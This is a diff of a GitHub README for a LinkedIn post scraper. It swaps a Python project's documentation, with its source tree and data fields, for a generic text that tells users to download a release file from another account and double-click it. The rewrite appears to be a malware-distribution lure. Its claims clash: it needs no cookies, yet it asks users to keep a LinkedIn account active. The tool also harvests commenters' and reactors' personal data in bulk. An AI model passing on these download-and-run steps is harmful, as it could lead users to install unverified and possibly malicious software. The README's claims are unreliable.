@@ -1,205 +1,64 @@
-# LinkedIn Profile Posts Bulk Scraper (No Cookies)
-This scraper extracts complete public posts from LinkedIn profiles and companies — including text, media, engagement, comments, and reactions — without requiring cookies or login. It enables fast, scalable access to fresh LinkedIn content for analytics, research, and outreach workflows. Built for reliability, speed, and high-volume data collection.
+# 📥 linkedin-profile-posts-bulk-scraper-no-cookies-2-per-1k - Easily Automate LinkedIn Posts Extraction
 
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/za2122/footer-section/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+Welcome to the `linkedin-profile-posts-bulk-scraper-no-cookies-2-per-1k` application! This tool allows you to easily extract posts from LinkedIn without the need for cookies. Whether you need insights for B2B lead research or engagement analytics, this tool simplifies the process.
 
+## 🛠️ Features
 
+- **B2B Lead Research:** Gather valuable data for your business needs.
+- **Comment Extraction:** View user interactions on LinkedIn posts.
+- **Company Posts Insights:** Analyze how companies engage with their audience.
+- **Engagement Analytics:** Measure the impact of LinkedIn posts.
+- **Profile Monitoring:** Stay updated on changes in important profiles.
+- **Reaction Analysis:** Understand audience reactions to posts.
+- **Social Data Mining:** Extract meaningful data from various profiles.
+  
+## 📃 System Requirements
 
+Before you download, ensure your system meets the following requirements:
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>LinkedIn Profile Posts Bulk Scraper (No Cookies)⚡$2 per 1k</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+- **Operating System:** Windows 10 or later, macOS 10.14 or later
+- **RAM:** At least 4 GB
+- **Storage:** Minimum of 100 MB of free space
+- **Internet Connection:** Required for downloading data from LinkedIn
+- **Browser:** Any modern browser (Chrome, Firefox, Safari)
 
+## 🔗 Download & Install
 
-## Introduction
-The LinkedIn Profile Posts Bulk Scraper provides a secure and efficient way to collect LinkedIn post data at scale. It solves the challenge of manually aggregating large volumes of post-level information, especially when tracking engagement trends or performing competitor and influencer analysis.
+To get started, visit the Releases page below to download the application. Click the link to access the latest version.
 
-### Why This Scraper Matters
-- Extracts full post details such as content, media, engagement metrics, reactions, and comments.
-- Does not require login or cookies, reducing friction and eliminating account risk.
-- Supports high concurrency, processing multiple profiles simultaneously.
-- Helps marketing, sales, and research teams collect structured LinkedIn insights quickly and safely.
-- Returns fresh, uncached data for accurate analysis.
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/callmemaxcee/linkedin-profile-posts-bulk-scraper-no-cookies-2-per-1k/releases)
 
-## Features
-| Feature | Description |
-|---------|-------------|
-| No Login Required | Access publicly visible LinkedIn posts without cookies or account authentication. |
-| High Concurrency | Scrapes up to 6 profiles or companies at a time for faster throughput. |
-| Full Post Extraction | Captures text, media, documents, engagement, author info, and timestamps. |
-| Reactions Scraping | Optional extraction of reactions, including reaction types and reacting users. |
-| Comments Scraping | Optional extraction of comments with full author info and timestamps. |
-| Flexible Pagination | Supports scraping all posts or limiting by maximum post count. |
-| Content Filters | Toggle inclusion of reposts and quote posts based on your needs. |
-| Fast Output Delivery | Returns structured post data in seconds with no caching. |
-| Multi-Format Export | Export data as JSON, CSV, XLS, or use via API. |
+1. Visit the [Releases Page](https://github.com/callmemaxcee/linkedin-profile-posts-bulk-scraper-no-cookies-2-per-1k/releases).
+2. Locate the latest version available for download.
+3. Click on the file to download it to your computer.
+4. Once downloaded, locate the file in your downloads folder.
+5. Double-click the file to run the application.
 
----
+## 📝 How to Use
 
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|------------|------------------|
-| type | Indicates whether the item is a post, reaction, or comment. |
-| id | Unique ID of the LinkedIn post or interaction. |
-| linkedinUrl | Direct link to the post. |
-| content | Full text content of the post. |
-| author | Object containing author details, name, profile URL, avatar, and headline. |
-| postedAt | Timestamps, date, and relative time indicators. |
-| postImages | List of images included in the post. |
-| document | Document metadata for posts containing PDFs or attachments. |
-| engagement | Counts for likes, comments, shares, and detailed reaction breakdowns. |
-| reactions | Individual reaction objects with type and actor information. |
-| comments | Full comment objects with text, user data, timestamps, and related metrics. |
+1. **Launch the Application:** Open the application on your device.
+2. **Select Parameters:** Enter the parameters for the LinkedIn posts you want to extract. This can include specific profiles, filter settings, or post types.
+3. **Start Extraction:** Click the "Start" button to initiate the extraction process.
+4. **View Results:** Once the extraction is complete, view the results directly in the application or export them as needed.
 
----
+## 💡 Tips
 
-## Example Output
+- Always ensure your LinkedIn account is active and in good standing when using the application.
+- Adjust the parameters according to your needs to get the best results.
+- Regularly check for updates on the Releases page to benefit from new features or fixes.
 
-    [
-      {
-        "type": "post",
-        "id": "7329207003942125568",
-        "linkedinUrl": "https://www.linkedin.com/posts/williamhgates_how-better-data-helped-us-cut-child-mortality",
-        "content": "The leading causes of childhood death reveal a stark truth...",
-        "author": {
-          "name": "Bill Gates",
-          "publicIdentifier": "williamhgates",
-          "linkedinUrl": "https://www.linkedin.com/in/williamhgates",
-          "info": "Chair, Gates Foundation and Founder, Breakthrough Energy"
-        },
-        "postedAt": {
-          "timestamp": 1747419119821,
-          "date": "2025-05-16T18:11:59.821Z"
-        },
-        "postImages": [],
-        "engagement": {
-          "likes": 2916,
-          "comments": 328,
-          "shares": 153
-        }
-      }
-    ]
+## 👩‍💻 Community & Support
 
----
+If you have questions or need assistance, feel free to reach out through our community page. Contributors are here to help you get the most out of this tool.
 
-## Directory Structure Tree
+## 🌐 Additional Resources
 
-    linkedin-profile-posts-bulk-scraper-no-cookies/
-    ├── src/
-    │   ├── runner.py
-    │   ├── extractors/
-    │   │   ├── linkedin_posts_parser.py
-    │   │   ├── reactions_parser.py
-    │   │   ├── comments_parser.py
-    │   │   └── utils_time.py
-    │   ├── outputs/
-    │   │   └── exporters.py
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── inputs.sample.txt
-    │   └── sample.json
-    ├── requirements.txt
-    └── README.md
+For more insights on how to maximize your usage of this application, consider exploring related topics:
 
----
+- **B2B Lead Research:** Understand how to gather and utilize leads effectively.
+- **Engagement Analytics:** Learn more about measuring engagement on social media platforms.
+- **Social Media Intelligence:** Explore techniques for analyzing social data for better marketing strategies.
 
-## Use Cases
-- **Market analysts** aggregate competitor and industry leader posts to monitor trends and engagement patterns.
-- **Sales and outreach teams** collect posts from prospects to personalize communication and timing.
-- **Researchers** analyze public sentiment, reactions, and comment behavior using structured LinkedIn data.
-- **Influencer marketing teams** track performance metrics of company or creator posts for campaign evaluation.
-- **Content strategists** benchmark engagement across similar profiles to refine content planning.
-
----
-
-## FAQs
-
-**Do I need a LinkedIn account or cookies to use this tool?**
-No. The scraper works without login or cookie authentication and only accesses publicly visible content.
-
-**Can it extract all reactions and comments?**
-Yes. By setting `maxReactions` or `maxComments` to `0`, the scraper retrieves all available reactions and comments.
-
-**Does it include reposts or quote posts?**
-You can toggle both `includeReposts` and `includeQuotePosts` depending on your needs.
-
-**How fresh is the data?**
-All content is scraped live on request, with no caching involved.
-
----
-
-## Performance Benchmarks and Results
-**Primary Metric:** Average extraction speed processes 6 profiles concurrently, typically returning results within seconds.
-**Reliability Metric:** Stable scraping with a high success rate across profiles and company pages.
-**Efficiency Metric:** Optimized throughput enables bulk retrieval of posts, reactions, and comments with minimal overhead.
-**Quality Metric:** Captures a complete data model including media, documents, author information, and full engagement metadata for high-accuracy analysis.
-
-
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtube.com/shorts/6AwB5omXrIM" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review3.gif" alt="Review 3" width="35%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Exceptional results, clear communication, and flawless delivery. Bitbash nailed it.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+By following the steps above, you will quickly gain access to powerful LinkedIn data extraction capabilities. The `linkedin-profile-posts-bulk-scraper-no-cookies-2-per-1k` tool makes LinkedIn insights accessible, helping you drive your business decisions effectively.
